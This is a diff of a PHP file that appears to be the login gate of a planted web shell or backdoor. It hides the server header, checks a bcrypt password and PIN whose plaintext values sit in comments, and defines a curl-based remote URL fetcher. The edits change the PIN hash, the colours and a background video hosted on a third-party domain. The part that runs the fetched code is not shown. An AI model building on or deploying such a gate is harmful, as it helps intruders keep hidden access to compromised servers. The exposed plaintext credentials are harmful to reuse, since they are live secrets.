@@ -9,7 +9,7 @@ header('X-Powered-By: none');
 header('Content-Type: text/html; charset=UTF-8');
 
 $hashed_password = '$2y$10$hEw84o9ot68EKvS0WHTmqeNncTm0ijnShx5frgZskHfhofzOcDv2y'; // bcrypt dari 'rahasia123'
-$hashed_pin = '$2y$10$coRx0fTZHevyqlmcgACS6eEkr8gvSQw3E5x1i4TxEW3UfMltSPDx2'; // bcrypt dari '246810'
+$hashed_pin = '$2y$10$n5Q7ETk4.BsqbZu1XE0fhORjKc1OQQnIKa9oDLGytag6OP/mFMDJm'; // bcrypt dari '246810'
 
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
@@ -64,16 +64,16 @@ if (is_logged_in()) {
       html, body { margin: 0; height: 100vh; overflow: hidden; }
       body { font-family: Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; perspective: 1000px; position: relative; }
       #bgVideo { position: fixed; top: 50%; left: 50%; width: auto; height: 100vh; min-width: 100vw; min-height: 100vh; transform: translate(-50%, -50%); z-index: -1; object-fit: cover; filter: brightness(0.6); }
-      .container { width: 320px; padding: 40px; background: rgba(17,17,17, 0.75); border-radius: 15px; box-shadow: 0 0 30px #680202; color: white; text-align: center; }
+      .container { width: 320px; padding: 40px; background: rgba(17,17,17, 0.75); border-radius: 15px; box-shadow: 0 0 30px #021e5ac9; color: white; text-align: center; }
       input { width: 80%; padding: 10px; margin: 15px 0; border-radius: 8px; border: none; outline: none; font-size: 1rem; }
-      button { width: 84%; padding: 12px; background: #680202; border: none; border-radius: 12px; color: #111; font-weight: bold; cursor: pointer; transition: background 0.3s ease; }
-      button:hover { background: #680202; }
+      button { width: 84%; padding: 12px; background: #ffffff; border: none; border-radius: 12px; color: #111; font-weight: bold; cursor: pointer; transition: background 0.3s ease; }
+      button:hover { background: #3b3b3b8a; }
       .error { color: red; margin-bottom: 20px; }
     </style>
     </head>
     <body>
       <video id="bgVideo" autoplay loop muted playsinline>
-        <source src="https://ukrim.org/img/asupandewasa.mp4" type="video/mp4" />
+        <source src="https://ukrim.org/img/tiny.mp4" type="video/mp4" />
         Your browser does not support the video tag.
       </video>
       <div class="container">
